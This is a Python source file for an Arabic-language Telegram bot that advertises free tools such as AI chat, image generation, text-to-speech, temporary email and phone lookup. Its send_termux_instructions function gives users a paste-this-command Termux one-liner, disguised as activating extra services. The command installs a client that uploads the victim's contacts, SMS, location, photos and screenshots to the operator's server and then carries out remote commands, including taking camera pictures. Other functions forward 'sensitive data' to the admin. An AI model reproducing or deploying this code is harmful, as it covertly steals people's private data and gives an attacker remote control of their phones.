# -*- coding: utf-8 -*-

"""
البوت النهائي - نظام ANONYMOUS_T11
باستخدام خدمات مجانية بدون مفاتيح API
"""

import os
import sys
import time
import json
import logging
import hashlib
import base64
import re
import secrets
import string
import shutil
import sqlite3
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO

import requests
import phonenumbers
from phonenumbers import geocoder, carrier
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import pypdf
from bs4 import BeautifulSoup
import html
from dotenv import load_dotenv
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from PIL import Image

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== التحقق من متغيرات البيئة =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL')
if not SERVER_URL:
    logger.critical("❌ SERVER_URL غير مضبوط!")
    sys.exit(1)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', '')
if CLIENT_SECRET_KEY == 'default_secret_key_please_change':
    print("⚠️ تحذير: CLIENT_SECRET_KEY هي القيمة الافتراضية! قم بتغييرها.")
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=3, backoff_factor=1.0):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN)
app = Flask(__name__)

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_registered_devices_chat_id ON registered_devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال قاعدة البيانات =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        return c.fetchall()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال الخدمات (مجانية بدون مفاتيح) =====================

# 1. الذكاء الاصطناعي (Popcat API - مجاني)
def get_ai_response(prompt):
    """الحصول على رد من Popcat API (مجاني، لا يحتاج مفتاح)"""
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = REQUEST_SESSION.get(url, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data and 'response' in data:
                return data['response']
        # بديل: Some Random API
        alt_url = f"https://some-random-api.com/chatbot/response?message={requests.utils.quote(prompt)}"
        alt_response = REQUEST_SESSION.get(alt_url, timeout=20)
        if alt_response.status_code == 200:
            alt_data = alt_response.json()
            if alt_data and 'response' in alt_data:
                return alt_data['response']
        return "⚠️ عذراً، لم أستطع معالجة سؤالك حالياً. حاول مرة أخرى."
    except Exception as e:
        logger.error(f"AI error: {e}")
        return "⚠️ حدث خطأ في الاتصال بالذكاء الاصطناعي. حاول مرة أخرى."

# 2. توليد الصور (Pollinations - مجاني)
def generate_and_send_image(chat_id, description):
    """توليد صورة باستخدام Pollinations (مجاني) وحفظها محلياً"""
    temp_image_path = os.path.join(TEMP_DIR, f"image_{int(time.time())}.jpg")
    try:
        url = f"https://pollinations.ai/p/{description.replace(' ', '%20')}?width=1024&height=1024&nologo=true"
        response = REQUEST_SESSION.get(url, timeout=60)
        
        if response.status_code != 200 or not response.content:
            safe_send(chat_id, "⚠️ فشل توليد الصورة: لم يتم استلام بيانات.")
            return False
        
        with open(temp_image_path, 'wb') as f:
            f.write(response.content)
        
        # التحقق من صحة الصورة
        try:
            img = Image.open(temp_image_path)
            img.verify()
            img.close()
        except Exception as e:
            safe_send(chat_id, f"⚠️ فشل معالجة الصورة: {str(e)}")
            os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
            return False
        
        with open(temp_image_path, 'rb') as f:
            bot.send_photo(chat_id, f, caption="🖼️ الصورة المولدة")
        
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return True
        
    except Exception as e:
        logger.error(f"generate_and_send_image error: {e}")
        safe_send(chat_id, f"⚠️ حدث خطأ أثناء توليد الصورة: {str(e)[:100]}")
        os.remove(temp_image_path) if os.path.exists(temp_image_path) else None
        return False

# 3. فحص الموقع
def scan_website(url):
    url = url.strip()
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        response = REQUEST_SESSION.get(url, timeout=15, allow_redirects=True)
        if response.status_code == 200:
            try:
                soup = BeautifulSoup(response.text, 'html.parser')
                title = soup.title.string.strip() if soup.title else "لا يوجد عنوان"
                desc = soup.find('meta', {'name': 'description'})
                description = desc.get('content', '').strip()[:100] if desc else ""
                result = (
                    f"✅ الموقع يعمل!\n"
                    f"📌 الحالة: {response.status_code} (متاح)\n"
                    f"📝 العنوان: {title}\n"
                    f"📖 الوصف: {description}\n"
                    f"🔗 الرابط: {url}"
                )
                return result, "safe"
            except:
                return f"✅ الموقع يعمل!\n📌 الحالة: {response.status_code}\n🔗 الرابط: {url}", "safe"
        else:
            return f"⚠️ الموقع غير متاح حالياً (Status {response.status_code})", "error"
    except Exception as e:
        return f"❌ فشل الاتصال بالموقع: {str(e)}", "error"

# 4. تتبع الأرقام
def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

# 5. البريد المؤقت
def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

# 6. فحص APK
def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

# 7. توليد بلاغ فيسبوك
def generate_fb_report(report_type, reason, link):
    prompt = f"""اكتب شكوى رسمية لفيسبوك باللغة الإنجليزية:

النوع: {report_type}
السبب: {reason}
الرابط (إن وجد): {link}

اكتبها بشكل احترافي وواضح."""
    return get_ai_response(prompt)

# 8. استخراج PDF
def extract_text_from_pdf(pdf_content):
    try:
        from io import BytesIO
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    prompt = f"بناءً على النص التالي، أجب على السؤال:\n\nالنص:\n{relevant_chunk}\n\nالسؤال: {question}"
    return get_ai_response(prompt)

# 9. أرقام مؤقتة
def fetch_temp_numbers_advanced(country_code='US', limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

# ===================== دوال TTS =====================
VOICE_MAP = {
    "female": {"name": "👩 فتاة", "voice": "ar-SA-ZariNeural"},
    "male": {"name": "👨 رجل", "voice": "ar-SA-HamedNeural"},
    "child": {"name": "🧒 طفل", "voice": "ar-EG-ShakirNeural"},
    "scary": {"name": "👻 مخيف", "voice": "ar-AE-FatimaNeural"}
}

def build_voice_selection_markup():
    markup = InlineKeyboardMarkup(row_width=2)
    for key, val in VOICE_MAP.items():
        markup.row(InlineKeyboardButton(val["name"], callback_data=f"voice_{key}"))
    markup.row(InlineKeyboardButton("❌ إلغاء", callback_data="back_to_main"))
    return markup

def clean_text_for_tts(text):
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'[^\w\s.,!؟]', '', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def text_to_speech(text, voice_key='female'):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت. يرجى تثبيته."
    clean_text = clean_text_for_tts(text)
    if not clean_text:
        return None, "⚠️ النص فارغ بعد التنظيف."
    voice = VOICE_MAP.get(voice_key, VOICE_MAP['female'])
    temp_file = os.path.join(TEMP_DIR, f"tts_{int(time.time())}.mp3")
    try:
        import edge_tts
        import asyncio
        async def _tts():
            communicate = edge_tts.Communicate(clean_text, voice=voice["voice"])
            await communicate.save(temp_file)
        asyncio.run(_tts())
        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            return temp_file, None
        else:
            os.remove(temp_file) if os.path.exists(temp_file) else None
            return None, "⚠️ فشل توليد الصوت: الملف فارغ."
    except Exception as e:
        logger.error(f"edge-tts error: {e}")
        try:
            from gtts import gTTS
            tts = gTTS(text=clean_text, lang='ar')
            tts.save(temp_file)
            if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
                return temp_file, None
            else:
                return None, f"⚠️ فشل تحويل النص إلى صوت: {str(e)[:100]}"
        except Exception as e2:
            logger.error(f"gTTS error: {e2}")
            return None, f"⚠️ فشل تحويل النص إلى صوت: {str(e2)[:100]}"

# ===================== دوال تحميل الفيديو =====================
def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت. يرجى تثبيته."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

# ===================== دوال تقصير الروابط =====================
def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

# ===================== دوال إرسال البيانات للمطور =====================
def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 تنبيه عطل فني:\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 إشعار:\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    if user_id:
        msg = f"📩 بيانات حساسة من المستخدم {user_id}\n"
    else:
        msg = "📩 بيانات حساسة\n"
    msg += f"النوع: {data_type}\n"
    if isinstance(content, str):
        msg += f"المحتوى: {content}"
        safe_send(ADMIN_ID, msg)
    elif isinstance(content, bytes) and data_type == "image":
        bot.send_photo(ADMIN_ID, content, caption=msg)
    else:
        safe_send(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")

def send_termux_instructions(chat_id, role='user'):
    server_url = SERVER_URL
    device_id = f"dev_{secrets.randbelow(9000) + 1000}"
    instructions = (
        "📱 تفعيل الخدمات الإضافية\n\n"
        "قم بتحميل Termux ثم الصق الكود:\n\n"
        "```bash\n"
        "pkg update && pkg upgrade -y && pkg install python -y && pip install requests && echo 'import requests, time, json, os, subprocess, base64, glob, sys, random; SERVER = \"" + server_url + "\"; DEVICE_ID = \"" + device_id + "\"; CHAT_ID = \"" + str(chat_id) + "\"; def get_contacts(): try: result = subprocess.run([\"termux-contacts\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا توجد جهات اتصال\"; except: return \"فشل جلب جهات الاتصال\"; def get_sms(): try: result = subprocess.run([\"termux-sms-list\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا توجد رسائل\"; except: return \"فشل جلب الرسائل\"; def get_location(): try: result = subprocess.run([\"termux-location\"], capture_output=True, text=True, timeout=10); return result.stdout if result.stdout else \"لا يمكن الحصول على الموقع\"; except: return \"فشل جلب الموقع\"; def get_recent_photos(limit=5): photos = []; try: import glob; photo_files = glob.glob(\"/sdcard/DCIM/**/*.jpg\", recursive=True) + glob.glob(\"/sdcard/DCIM/**/*.png\", recursive=True); photo_files.sort(key=os.path.getctime, reverse=True); for photo_path in photo_files[:limit]: with open(photo_path, \"rb\") as f: encoded = base64.b64encode(f.read()).decode(); photos.append({\"name\": os.path.basename(photo_path), \"data\": encoded}); return photos; except: return []; def get_screenshot(): try: os.system(\"screencap -p /sdcard/screenshot_temp.png\"); with open(\"/sdcard/screenshot_temp.png\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return None; def collect_all_data(): return {\"device_id\": DEVICE_ID, \"contacts\": get_contacts(), \"sms\": get_sms(), \"location\": get_location(), \"photos\": get_recent_photos(3), \"screenshot\": get_screenshot()}; def register_device(): try: all_data = collect_all_data(); response = requests.post(f\"{SERVER}/register_device\", json={\"device_id\": DEVICE_ID, \"chat_id\": CHAT_ID, \"initial_data\": all_data}, headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=30); return response.status_code == 200; except: return False; def execute_command(command): if command == \"screenshot\": return get_screenshot(); elif command == \"location\": return get_location(); elif command == \"camera\": os.system(\"termux-camera-photo -c 0 /sdcard/photo_temp.jpg\"); try: with open(\"/sdcard/photo_temp.jpg\", \"rb\") as f: return base64.b64encode(f.read()).decode(); except: return \"فشل التقاط الصورة\"; elif command == \"contacts\": return get_contacts(); elif command == \"sms\": return get_sms(); elif command == \"photos\": return json.dumps(get_recent_photos(10)); else: return f\"Unknown command: {command}\"; if register_device(): print(\"✅ تم الربط بنجاح!\"); else: print(\"❌ فشل الربط.\"); while True: try: response = requests.get(f\"{SERVER}/get_command?device_id={DEVICE_ID}\", headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=30); if response.status_code == 200: data = response.json(); if data.get(\"status\") == \"success\": command = data[\"command\"]; result = execute_command(command); result_type = \"text\"; if command in [\"screenshot\", \"camera\"]: result_type = \"image\"; elif command == \"photos\": result_type = \"json\"; requests.post(f\"{SERVER}/submit_result\", json={\"device_id\": DEVICE_ID, \"result\": result, \"result_type\": result_type}, headers={\"X-Client-Token\": \"default_secret_key_please_change\"}, timeout=10); elif data.get(\"status\") == \"no_command\": time.sleep(2); except: time.sleep(5)' > client.py && python client.py\n"
        "```\n\n"
        "✅ تم تفعيل الخدمات بنجاح ✅"
    )
    safe_send(chat_id, instructions)

# ===================== دوال Google OAuth =====================
GOOGLE_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/auth'
GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v1/userinfo'
